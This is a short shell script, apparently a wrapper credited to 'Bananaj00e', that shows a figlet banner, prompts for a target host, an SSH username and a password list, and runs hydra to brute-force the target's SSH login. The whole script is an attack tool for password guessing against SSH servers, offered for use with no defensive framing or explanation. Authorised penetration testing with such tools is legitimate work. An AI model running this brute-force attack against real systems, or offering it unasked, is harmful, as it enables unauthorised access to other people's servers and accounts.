clear
figlet    Hydra
echo "                  by Bananaj00e"
echo ""
read -p "Enter Host : " host
read -p "Enter Username of SSH : " user
read -p "Enter Password list path : " pass
clear
hydra -l $user -P $pass ssh://$host
